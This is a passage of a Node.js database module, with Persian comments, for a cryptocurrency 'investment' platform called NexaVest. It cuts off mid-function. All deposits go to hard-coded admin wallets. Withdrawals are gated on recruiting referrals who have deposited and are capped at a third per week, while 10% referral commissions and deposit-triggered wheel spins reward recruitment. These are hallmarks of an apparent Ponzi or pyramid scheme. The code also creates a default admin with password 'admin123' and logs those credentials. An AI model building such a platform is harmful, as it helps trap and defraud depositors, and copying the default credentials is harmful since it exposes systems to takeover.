const Database = require('better-sqlite3');
const bcrypt = require('bcryptjs');
const crypto = require('crypto');
const REFERRAL_RATE = parseFloat(process.env.REFERRAL_RATE || '0.10');
// ============================================
// Database Class
// ============================================

class InvestmentDB {
    constructor() {
        this.db = new Database('./cryptoinvest.db');
        
        // آدرس ولت ادمین (از .env)
        this.adminAddress = process.env.ADMIN_WALLET || '0xYourAdminWalletAddress';
    }

    init() {
        // Users table - با ولت‌ها
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_uid TEXT UNIQUE,
                email TEXT UNIQUE NOT NULL,
                password TEXT NOT NULL,
                full_name TEXT,
                phone TEXT,
                referral_code TEXT UNIQUE NOT NULL,
                referred_by TEXT,
                
                -- ولت‌های BEP20
                wallet_address TEXT,
                wallet_private_encrypted TEXT,
                trc20_address TEXT,
                bep20_address TEXT,
                
                -- موجودی سیستم
                wallet_balance REAL DEFAULT 0,
                withdrawable_balance REAL DEFAULT 0,
                total_deposit REAL DEFAULT 0,
                total_withdraw REAL DEFAULT 0,
                total_profit REAL DEFAULT 0,
                
                -- KYC
                kyc_status TEXT DEFAULT 'pending',
                kyc_documents TEXT,
                withdraw_lock_disabled INTEGER DEFAULT 0,
                withdraw_referral_limit_disabled INTEGER DEFAULT 0,
                wheel_spins INTEGER DEFAULT 0,
                
                -- نقش
                role TEXT DEFAULT 'user',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_trade_date DATE,
                trades_today INTEGER DEFAULT 0
            )
        `);

        // Transactions
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS transactions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                type TEXT NOT NULL,
                amount REAL NOT NULL,
                net_amount REAL,
                status TEXT DEFAULT 'completed',
                tx_hash TEXT,
                description TEXT,
                network TEXT DEFAULT 'bep20',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Known deposits - prevents double crediting the same TX hash
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS known_deposits (
                tx_hash TEXT PRIMARY KEY,
                user_id INTEGER,
                amount REAL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        // Best-effort database-level duplicate protection. Existing duplicate rows
        // are preserved; in that rare case the application transaction still blocks new duplicates.
        try {
            this.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS idx_unique_deposit_tx_hash_nocase
                ON transactions(lower(trim(tx_hash)))
                WHERE type = 'deposit' AND tx_hash IS NOT NULL AND trim(tx_hash) <> ''`);
        } catch (error) {
            console.warn('Unique deposit hash index was not created because old duplicate rows exist.');
        }

        // Admin deposit address config for direct-to-admin deposits
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS admin_config (
                id INTEGER PRIMARY KEY,
                tron_address TEXT,
                bsc_address TEXT,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Sweep history
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS sweep_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                wallet_address TEXT NOT NULL,
                balance_checked REAL,
                amount_swept REAL,
                tx_hash TEXT,
                status TEXT DEFAULT 'success',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Trades
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS trades (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                pair TEXT NOT NULL,
                direction TEXT NOT NULL,
                amount REAL NOT NULL,
                profit_percentage REAL NOT NULL,
                profit_amount REAL,
                status TEXT DEFAULT 'pending',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                closed_at DATETIME
            )
        `);

        // Withdrawals
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS withdrawals (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                amount REAL NOT NULL,
                fee_amount REAL DEFAULT 0,
                net_amount REAL,
                wallet_address TEXT NOT NULL,
                network TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                admin_notes TEXT,
                processed_at DATETIME,
                tx_hash TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Withdrawal limit settings
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS withdrawal_settings (
                id INTEGER PRIMARY KEY,
                enabled INTEGER DEFAULT 1,
                require_active_referral INTEGER DEFAULT 1,
                min_active_referrals INTEGER DEFAULT 1,
                active_referral_min_deposit REAL DEFAULT 100,
                weekly_withdraw_ratio REAL DEFAULT 0.3333333333,
                weekly_window_days INTEGER DEFAULT 7,
                kyc_required INTEGER DEFAULT 1,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        this.db.prepare(`
            INSERT OR IGNORE INTO withdrawal_settings
            (id, enabled, require_active_referral, min_active_referrals, active_referral_min_deposit, weekly_withdraw_ratio, weekly_window_days, kyc_required)
            VALUES (1, 1, 1, 1, 100, 0.3333333333, 7, 1)
        `).run();
        // Safe migrations for existing databases
        try { this.db.prepare(`ALTER TABLE users ADD COLUMN withdraw_referral_limit_disabled INTEGER DEFAULT 0`).run(); } catch (_) {}
        try { this.db.prepare(`ALTER TABLE users ADD COLUMN withdrawable_balance REAL DEFAULT 0`).run(); } catch (_) {}
        try { this.db.prepare(`ALTER TABLE withdrawal_settings ADD COLUMN kyc_required INTEGER DEFAULT 1`).run(); } catch (_) {}

        // Referral
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS referral_rewards (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                referrer_id INTEGER NOT NULL,
                referred_id INTEGER NOT NULL,
                reward_amount REAL NOT NULL,
                from_deposit REAL NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Admin/user notifications
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS notifications (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_user_id INTEGER,
                title TEXT NOT NULL,
                title_fa TEXT,
                message TEXT NOT NULL,
                message_fa TEXT,
                type TEXT DEFAULT 'info',
                created_by INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS notification_reads (
                notification_id INTEGER NOT NULL,
                user_id INTEGER NOT NULL,
                read_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (notification_id, user_id)
            )
        `);



        // Support tickets
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS tickets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                subject TEXT NOT NULL,
                priority TEXT DEFAULT 'normal',
                status TEXT DEFAULT 'open',
                admin_unread INTEGER DEFAULT 1,
                user_unread INTEGER DEFAULT 0,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS ticket_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ticket_id INTEGER NOT NULL,
                sender_id INTEGER NOT NULL,
                sender_role TEXT NOT NULL,
                message TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Email verification codes for registration and withdrawals
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS verification_codes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                email TEXT NOT NULL,
                purpose TEXT NOT NULL,
                code_hash TEXT NOT NULL,
                metadata TEXT,
                attempts INTEGER DEFAULT 0,
                expires_at DATETIME NOT NULL,
                used_at DATETIME,
                last_sent_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        this.db.exec(`CREATE INDEX IF NOT EXISTS idx_verification_codes_lookup ON verification_codes(email, purpose, used_at, expires_at)`);


        // Lucky wheel campaign settings and results
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS lucky_wheel_settings (
                id INTEGER PRIMARY KEY,
                enabled INTEGER DEFAULT 1,
                popup_enabled INTEGER DEFAULT 1,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS lucky_wheel_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                prize_code TEXT NOT NULL,
                prize_label TEXT NOT NULL,
                prize_amount REAL DEFAULT 0,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        this.db.prepare(`INSERT OR IGNORE INTO lucky_wheel_settings (id, enabled, popup_enabled) VALUES (1, 1, 1)`).run();

        // Admin wallet config
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS admin_wallet (
                id INTEGER PRIMARY KEY,
                address TEXT,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);

        this.runMigrations();
        this.createAdminUser();
        this.ensureAdminConfig();
        
        console.log('✅ Database initialized');
    }

    createAdminUser() {
        const admin = this.db.prepare('SELECT * FROM users WHERE role = ?').get('admin');
        if (!admin) {
            const hashedPassword = bcrypt.hashSync('admin123', 10);
            
            this.db.prepare(`
                INSERT INTO users (user_uid, email, password, full_name, referral_code, role, kyc_status)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            `).run(this.generatePublicUserId(), 'admin@nexavest.local', hashedPassword, 'Administrator', 'ADMIN2024', 'admin', 'approved');
            
            // ذخیره آدرس ولت ادمین
            this.db.prepare(`
                INSERT INTO admin_wallet (id, address)
                VALUES (1, ?)
            `).run(this.adminAddress);
            
            console.log('🔐 Admin: admin@nexavest.local / admin123');
            console.log('📋 Admin referral: ADMIN2024');
            console.log('💰 Admin wallet:', this.adminAddress);
        }
    }

    // Direct-to-admin mode: no private key is generated or stored for users.
    createWalletForUser(userId) {
        const addresses = this.getAdminAddresses();
        this.db.prepare(`
            UPDATE users SET
                wallet_address = ?,
                wallet_private_encrypted = NULL,
                trc20_address = ?,
                bep20_address = ?
            WHERE id = ?
        `).run(addresses.bsc, addresses.tron, addresses.bsc, userId);

        console.log(`🔵 Direct deposit addresses assigned to user ${userId}`);
        return { address: addresses.bsc, trc20: addresses.tron, bep20: addresses.bsc };
    }

    // Direct-to-admin mode: automatic sweeping is disabled.
    async checkWalletBalance(address) {
        return 0;
    }

    async sweepToAdmin() {
        return { success: false, error: 'Sweep is disabled in direct-to-admin mode' };
    }

    async checkAllWallets() {
        return [];
    }

    // اضافه کردن به موجودی کاربر
    addToBalance(userId, amount) {
        const before = this.db.prepare('SELECT COALESCE(total_deposit, 0) as total_deposit FROM users WHERE id = ?').get(userId);
        this.db.prepare(`
            UPDATE users SET 
                wallet_balance = wallet_balance + ?,
                total_deposit = total_deposit + ?
            WHERE id = ?
        `).run(amount, amount, userId);
        this.awardFirstDepositWheelSpin(userId, amount, before?.total_deposit || 0);
        
        this.db.prepare(`
            INSERT INTO transactions (user_id, type, amount, net_amount, status, description)
            VALUES (?, 'deposit', ?, ?, 'completed', 'Auto deposit from wallet')
        `).run(userId, amount, amount);
        
        // پاداش رفرال
        this.awardReferralBonus(userId, amount, null, 'wallet deposit');
    }

    // دریافت آدرس ادمین
    getAdminAddress() {
        const config = this.db.prepare('SELECT address FROM admin_wallet WHERE id = 1').get();
        return config?.address || this.adminAddress;
    }

    // دریافت آدرس کاربر
    getUserWallet(userId) {
        const user = this.db.prepare('SELECT wallet_address FROM users WHERE id = ?').get(userId);
        return user?.wallet_address || null;
    }

    // Add missing columns/tables when database already exists
    runMigrations() {
        const columns = this.db.prepare("PRAGMA table_info(users)").all().map(c => c.name);
        const addColumn = (name, sql) => {
            if (!columns.includes(name)) this.db.exec(`ALTER TABLE users ADD COLUMN ${sql}`);
        };
        addColumn('withdrawable_balance', 'withdrawable_balance REAL DEFAULT 0');
        addColumn('user_uid', 'user_uid TEXT');
        addColumn('trc20_address', 'trc20_address TEXT');
        addColumn('bep20_address', 'bep20_address TEXT');
        addColumn('total_withdraw', 'total_withdraw REAL DEFAULT 0');
        addColumn('total_profit', 'total_profit REAL DEFAULT 0');
        addColumn('kyc_documents', 'kyc_documents TEXT');
        addColumn('withdraw_lock_disabled', 'withdraw_lock_disabled INTEGER DEFAULT 0');
        addColumn('wheel_spins', 'wheel_spins INTEGER DEFAULT 0');

        // Request/notification indexes and compatibility tables for existing databases
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS notifications (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_user_id INTEGER,
                title TEXT NOT NULL,
                title_fa TEXT,
                message TEXT NOT NULL,
                message_fa TEXT,
                type TEXT DEFAULT 'info',
                created_by INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS notification_reads (
                notification_id INTEGER NOT NULL,
                user_id INTEGER NOT NULL,
                read_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (notification_id, user_id)
            )
        `);

        const notificationColumns = this.db.prepare("PRAGMA table_info(notifications)").all().map(c => c.name);
        if (!notificationColumns.includes('title_fa')) this.db.exec(`ALTER TABLE notifications ADD COLUMN title_fa TEXT`);
        if (!notificationColumns.includes('message_fa')) this.db.exec(`ALTER TABLE notifications ADD COLUMN message_fa TEXT`);
        this.db.exec(`CREATE INDEX IF NOT EXISTS idx_notifications_target ON notifications(target_user_id, created_at)`);
        this.db.exec(`CREATE INDEX IF NOT EXISTS idx_notification_reads_user ON notification_reads(user_id, notification_id)`);

        // Remove the old one-time Lucky Spin / Wheel "coming soon" broadcast.
        // Reward notifications and the actual wheel feature are not affected.
        try {
            const obsoleteWheelIds = this.db.prepare(`
                SELECT id FROM notifications
                WHERE lower(COALESCE(message, '')) LIKE '%will soon add the wheel of fortune%'
                   OR (lower(COALESCE(title, '')) LIKE '%lucky spin%' AND lower(COALESCE(message, '')) LIKE '%soon%')
                   OR (COALESCE(message_fa, '') LIKE '%به زودی%' AND COALESCE(message_fa, '') LIKE '%چرخ شانس%')
            `).all().map(row => row.id);
            if (obsoleteWheelIds.length) {
                const removeReads = this.db.prepare('DELETE FROM notification_reads WHERE notification_id = ?');
                const removeNotification = this.db.prepare('DELETE FROM notifications WHERE id = ?');
                this.db.transaction(() => {
                    obsoleteWheelIds.forEach(id => {
                        removeReads.run(id);
                        removeNotification.run(id);
                    });
                })();
            }
        } catch (error) {
            console.warn('Old wheel announcement cleanup skipped:', error.message);
        }

        // Support ticket tables and indexes for existing databases
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS tickets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                subject TEXT NOT NULL,
                priority TEXT DEFAULT 'normal',
                status TEXT DEFAULT 'open',
                admin_unread INTEGER DEFAULT 1,
                user_unread INTEGER DEFAULT 0,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS ticket_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ticket_id INTEGER NOT NULL,
                sender_id INTEGER NOT NULL,
                sender_role TEXT NOT NULL,
                message TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        this.db.exec(`CREATE INDEX IF NOT EXISTS idx_tickets_user_status ON tickets(user_id, status, updated_at)`);
        this.db.exec(`CREATE INDEX IF NOT EXISTS idx_tickets_status ON tickets(status, updated_at)`);
        this.db.exec(`CREATE INDEX IF NOT EXISTS idx_ticket_messages_ticket ON ticket_messages(ticket_id, created_at)`);



        // Email verification table for existing databases
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS verification_codes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                email TEXT NOT NULL,
                purpose TEXT NOT NULL,
                code_hash TEXT NOT NULL,
                metadata TEXT,
                attempts INTEGER DEFAULT 0,
                expires_at DATETIME NOT NULL,
                used_at DATETIME,
                last_sent_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        this.db.exec(`CREATE INDEX IF NOT EXISTS idx_verification_codes_lookup ON verification_codes(email, purpose, used_at, expires_at)`);


        // Lucky wheel tables for existing databases
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS lucky_wheel_settings (
                id INTEGER PRIMARY KEY,
                enabled INTEGER DEFAULT 1,
                popup_enabled INTEGER DEFAULT 1,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS lucky_wheel_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                prize_code TEXT NOT NULL,
                prize_label TEXT NOT NULL,
                prize_amount REAL DEFAULT 0,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        this.db.prepare(`INSERT OR IGNORE INTO lucky_wheel_settings (id, enabled, popup_enabled) VALUES (1, 1, 1)`).run();
        this.db.exec(`CREATE INDEX IF NOT EXISTS idx_lucky_wheel_results_user ON lucky_wheel_results(user_id, created_at)`);

        const txColumns = this.db.prepare("PRAGMA table_info(transactions)").all().map(c => c.name);
        const addTxColumn = (name, sql) => {
            if (!txColumns.includes(name)) this.db.exec(`ALTER TABLE transactions ADD COLUMN ${sql}`);
        };
        addTxColumn('net_amount', 'net_amount REAL');
        addTxColumn('status', "status TEXT DEFAULT 'completed'");
        addTxColumn('tx_hash', 'tx_hash TEXT');
        addTxColumn('network', "network TEXT DEFAULT 'bep20'");

        const rewardColumns = this.db.prepare("PRAGMA table_info(referral_rewards)").all().map(c => c.name);
        const addRewardColumn = (name, sql) => {
            if (!rewardColumns.includes(name)) this.db.exec(`ALTER TABLE referral_rewards ADD COLUMN ${sql}`);
        };
        addRewardColumn('source_tx_hash', 'source_tx_hash TEXT');
        addRewardColumn('source_type', "source_type TEXT DEFAULT 'deposit'");

        const withdrawalColumns = this.db.prepare("PRAGMA table_info(withdrawals)").all().map(c => c.name);
        const addWithdrawalColumn = (name, sql) => {
            if (!withdrawalColumns.includes(name)) this.db.exec(`ALTER TABLE withdrawals ADD COLUMN ${sql}`);
        };
        addWithdrawalColumn('fee_amount', 'fee_amount REAL DEFAULT 0');
        addWithdrawalColumn('net_amount', 'net_amount REAL');
        this.db.exec(`UPDATE withdrawals SET net_amount = amount WHERE net_amount IS NULL`);

        this.db.exec(`
            CREATE TABLE IF NOT EXISTS withdrawal_settings (
                id INTEGER PRIMARY KEY,
                enabled INTEGER DEFAULT 1,
                require_active_referral INTEGER DEFAULT 1,
                min_active_referrals INTEGER DEFAULT 1,
                active_referral_min_deposit REAL DEFAULT 100,
                weekly_withdraw_ratio REAL DEFAULT 0.3333333333,
                weekly_window_days INTEGER DEFAULT 7,
                kyc_required INTEGER DEFAULT 1,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        this.db.prepare(`
            INSERT OR IGNORE INTO withdrawal_settings
            (id, enabled, require_active_referral, min_active_referrals, active_referral_min_deposit, weekly_withdraw_ratio, weekly_window_days, kyc_required)
            VALUES (1, 1, 1, 1, 100, 0.3333333333, 7, 1)
        `).run();
        const withdrawalSettingsColumns = this.db.prepare("PRAGMA table_info(withdrawal_settings)").all().map(c => c.name);
        const addWithdrawalSettingColumn = (name, sql) => {
            if (!withdrawalSettingsColumns.includes(name)) this.db.exec(`ALTER TABLE withdrawal_settings ADD COLUMN ${sql}`);
        };
        addWithdrawalSettingColumn('enabled', 'enabled INTEGER DEFAULT 1');
        addWithdrawalSettingColumn('require_active_referral', 'require_active_referral INTEGER DEFAULT 1');
        addWithdrawalSettingColumn('min_active_referrals', 'min_active_referrals INTEGER DEFAULT 1');
        addWithdrawalSettingColumn('active_referral_min_deposit', 'active_referral_min_deposit REAL DEFAULT 100');
        addWithdrawalSettingColumn('weekly_withdraw_ratio', 'weekly_withdraw_ratio REAL DEFAULT 0.3333333333');
        addWithdrawalSettingColumn('weekly_window_days', 'weekly_window_days INTEGER DEFAULT 7');
        addWithdrawalSettingColumn('updated_at', 'updated_at DATETIME DEFAULT CURRENT_TIMESTAMP');

        this.db.exec(`CREATE INDEX IF NOT EXISTS idx_users_referred_by ON users(referred_by)`);
        this.db.exec(`CREATE INDEX IF NOT EXISTS idx_referral_rewards_referrer ON referral_rewards(referrer_id)`);
        this.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS idx_referral_rewards_source_tx ON referral_rewards(source_tx_hash) WHERE source_tx_hash IS NOT NULL`);



        // Multi-asset balances for N-VT Miner
        this.db.exec(`
            CREATE TABLE IF NOT EXISTS crypto_balances (
                user_id INTEGER NOT NULL,
                asset TEXT NOT NULL,
                amount REAL DEFAULT 0,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (user_id, asset)
            )
        `);
        this.db.exec(`CREATE INDEX IF NOT EXISTS idx_crypto_balances_user ON crypto_balances(user_id)`);

        const tradeColumns = this.db.prepare("PRAGMA table_info(trades)").all().map(c => c.name);
        const addTradeColumn = (name, sql) => { if (!tradeColumns.includes(name)) this.db.exec(`ALTER TABLE trades ADD COLUMN ${sql}`); };
        addTradeColumn('asset_price', 'asset_price REAL DEFAULT 1');
        addTradeColumn('asset_amount', 'asset_amount REAL DEFAULT 0');
        addTradeColumn('return_usdt', 'return_usdt REAL DEFAULT 0');
        addTradeColumn('claimable_at', 'claimable_at DATETIME');

        const withdrawalColumnsV35 = this.db.prepare("PRAGMA table_info(withdrawals)").all().map(c => c.name);
        const addWithdrawalColumnV35 = (name, sql) => { if (!withdrawalColumnsV35.includes(name)) this.db.exec(`ALTER TABLE withdrawals ADD COLUMN ${sql}`); };
        addWithdrawalColumnV35('asset', "asset TEXT DEFAULT 'USDT'");
        addWithdrawalColumnV35('asset_price', 'asset_price REAL DEFAULT 1');
        addWithdrawalColumnV35('amount_usdt', 'amount_usdt REAL');

        // Give every legacy user a unique referral code so referral links always work.
        const missingCodes = this.db.prepare("SELECT id FROM users WHERE referral_code IS NULL OR referral_code = ''").all();
        for (const row of missingCodes) {
            let code;
            do { code = this.generateReferralCode(); } while (this.db.prepare('SELECT id FROM users WHERE referral_code = ?').get(code));
            this.db.prepare('UPDATE users SET referral_code = ? WHERE id = ?').run(code, row.id);
        }

        // Give every existing user a public random NVT user ID. This is shown on the profile page.
        const missingUserIds = this.db.prepare("SELECT id FROM users WHERE user_uid IS NULL OR user_uid = ''").all();
        for (const row of missingUserIds) {
            let uid;
            do { uid = this.generatePublicUserId(); } while (this.db.prepare('SELECT id FROM users WHERE user_uid = ?').get(uid));
            this.db.prepare('UPDATE users SET user_uid = ? WHERE id = ?').run(uid, row.id);
        }
        this.db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS idx_users_user_uid ON users(user_uid)`);
    }

    getReferralTierByCount(activeCount) {
        const count = Number(activeCount || 0);
        return { code: 'standard', name: 'Standard', name_fa: 'استاندارد', min: 1, max: null, rate: 0.10, rank_bonus: 0 };
    }

    getReferralTierList() {
        return [
            { code: 'standard', name: 'Standard', name_fa: 'استاندارد', min: 1, max: null, rate: 0.10, rank_bonus: 0, range: 'All active referrals' }
        ];
    }

    getActiveReferralCount(referrerId) {
        const row = this.db.prepare(`
            SELECT COUNT(*) as count FROM users WHERE referred_by = ? AND role = 'user' AND total_deposit > 0
        `).get(referrerId);
        return row?.count || 0;
    }

    awardFirstDepositWheelSpin(userId, depositAmount, existingTotalDeposit = 0) {
        const amount = Number(depositAmount || 0);
        const previous = Number(existingTotalDeposit || 0);
        const minForWheel = parseFloat(process.env.WHEEL_FIRST_DEPOSIT_MIN_USDT || process.env.MIN_DEPOSIT_USDT || '100');
        if (!Number.isFinite(amount) || amount < minForWheel || previous > 0) {
            return { credited: false, reason: 'not_first_qualified_deposit' };
        }
        try {
            this.db.prepare('UPDATE users SET wheel_spins = COALESCE(wheel_spins, 0) + 1 WHERE id = ?').run(userId);
            this.db.prepare(`
                INSERT INTO notifications (target_user_id, title, title_fa, message, message_fa, type, created_by)
                VALUES (?, ?, ?, ?, ?, 'success', NULL)
            `).run(
                userId,
                'Lucky Wheel chance added',
                'شانس گردونه به حساب شما اضافه شد',
                'Your deposit was confirmed and 1 Lucky Wheel chance was added to your account.',
                'واریز شما تایید شد و ۱ شانس گردونه به حساب شما اضافه شد.'
            );
            return { credited: true, spins: 1 };
        } catch (e) {
            console.error('First deposit wheel spin error:', e.message);
            return { credited: false, reason: 'db_error' };
        }
    }

    awardReferralRankBonus(referrerId, activeCount) {
        return { credited: false, reason: 'rank_bonus_disabled', tier: this.getReferralTierByCount(activeCount) };
    }

    awardReferralBonus(referredUserId, depositAmount, sourceTxHash = null, sourceType = 'deposit') {
        const amount = Number(depositAmount || 0);
        if (!Number.isFinite(amount) || amount <= 0) {
            return { credited: false, reason: 'invalid_amount' };
        }

        const referred = this.db.prepare('SELECT id, referred_by FROM users WHERE id = ?').get(referredUserId);
        const referrerId = referred && referred.referred_by ? Number(referred.referred_by) : 0;
        if (!referrerId || referrerId === Number(referredUserId)) {
            return { credited: false, reason: 'no_referrer' };
        }

        const referrer = this.db.prepare('SELECT id FROM users WHERE id = ?').get(referrerId);
        if (!referrer) return { credited: false, reason: 'referrer_not_found' };

        const cleanSourceTx = sourceTxHash ? String(sourceTxHash).trim() : null;
        if (cleanSourceTx) {
            const existing = this.db.prepare('SELECT id FROM referral_rewards WHERE source_tx_hash = ?').get(cleanSourceTx);
            if (existing) return { credited: false, reason: 'already_credited' };
        }

        const activeCount = this.getActiveReferralCount(referrerId);
        const tier = this.getReferralTierByCount(activeCount);
        const bonus = Math.round((amount * tier.rate) * 100000000) / 100000000;
        if (bonus <= 0) return { credited: false, reason: 'zero_bonus' };

        this.db.prepare('UPDATE users SET withdrawable_balance = COALESCE(withdrawable_balance,0) + ? WHERE id = ?').run(bonus, referrerId);
        this.db.prepare(`
            INSERT INTO transactions (user_id, type, amount, net_amount, status, description)
            VALUES (?, 'referral', ?, ?, 'completed', ?)
        `).run(referrerId, bonus, bonus, `10% referral commission from ${sourceType}`);
        this.db.prepare(`
            INSERT INTO referral_rewards (referrer_id, referred_id, reward_amount, from_deposit, source_tx_hash, source_type)
            VALUES (?, ?, ?, ?, ?, ?)
        `).run(referrerId, referredUserId, bonus, amount, cleanSourceTx, sourceType);

        // Referral wheel reward: 1 spin for referrer and 1 spin for the referred user after a successful referred deposit.
        this.db.prepare('UPDATE users SET wheel_spins = COALESCE(wheel_spins,0) + 1 WHERE id IN (?, ?)').run(referrerId, referredUserId);
        this.db.prepare(`
            INSERT INTO notifications (target_user_id, title, title_fa, message, message_fa, type, created_by)
            VALUES (?, ?, ?, ?, ?, 'success', NULL), (?, ?, ?, ?, ?, 'success', NULL)
        `).run(
            referrerId,
            'Referral reward credited',
            'پاداش معرفی و شانس گردونه اضافه شد',
            `You received ${bonus} USDT withdrawable referral reward and 1 Lucky Wheel chance.`,
            `شما ${bonus} تتر پاداش قابل برداشت معرفی و ۱ شانس گردونه دریافت کردید.`,
            referredUserId,
            'Referral wheel chance added',
            'شانس گردونه معرفی اضافه شد',
            'Your successful deposit unlocked 1 Lucky Wheel chance through referral.',
            'با واریز موفق شما، ۱ شانس گردونه رفرالی به حساب شما اضافه شد.'
        );

        const rankBonus = this.awardReferralRankBonus(referrerId, activeCount);

        return { credited: true, referrer_id: referrerId, reward_amount: bonus, rate: tier.rate, tier, active_referrals: activeCount, rank_bonus: rankBonus };
    }

    getReferralSummary(userId) {
        const totalReferrals = this.db.prepare(`
            SELECT COUNT(*) as count FROM users WHERE referred_by = ? AND role = 'user'
        `).get(userId);
        const activeReferrals = this.db.prepare(`
            SELECT COUNT(*) as count FROM users WHERE referred_by = ? AND role = 'user' AND total_deposit > 0
        `).get(userId);
        const earnings = this.db.prepare(`
            SELECT COALESCE(SUM(reward_amount), 0) as total FROM referral_rewards WHERE referrer_id = ?
        `).get(userId);
        const active = activeReferrals?.count || 0;
        const tier = this.getReferralTierByCount(active);
        const nextTier = this.getReferralTierList().find(t => t.min > active) || null;
        return {
            total_referrals: totalReferrals?.count || 0,
            active_referrals: active,
            total_earnings: earnings?.total || 0,
            referral_bonus_percentage: Math.round(tier.rate * 100),
            referral_tier: tier,
            next_referral_tier: nextTier,
            referral_tiers: this.getReferralTierList()
        };
    }

    ensureAdminConfig() {
        const existing = this.db.prepare('SELECT id FROM admin_config WHERE id = 1').get();
        if (!existing) {
            this.db.prepare(`
                INSERT INTO admin_config (id, tron_address, bsc_address)
                VALUES (1, ?, ?)
            `).run(
                process.env.TRON_ADDRESS || process.env.ADMIN_TRON_ADDRESS || 'TFVSKHiakSiSMR7VyGjDzWxfPSPnSSwNPg',
                process.env.BSC_ADDRESS || process.env.ADMIN_WALLET || '0xe410bbb0dafee7879626382ddfc40223040c8a06'
            );
        }
    }

    getAdminAddresses() {
        const config = this.db.prepare('SELECT * FROM admin_config WHERE id = 1').get();
        return {
            tron: config?.tron_address || process.env.TRON_ADDRESS || process.env.ADMIN_TRON_ADDRESS || 'TFVSKHiakSiSMR7VyGjDzWxfPSPnSSwNPg',
            bsc: config?.bsc_address || process.env.BSC_ADDRESS || process.env.ADMIN_WALLET || '0xe410bbb0dafee7879626382ddfc40223040c8a06'
        };
    }

    generateWalletAddress(network) {
        // These are placeholder deposit labels only; direct deposits use admin addresses.
        // Kept for compatibility with the current auth/register route.
        if (network === 'trc20') {
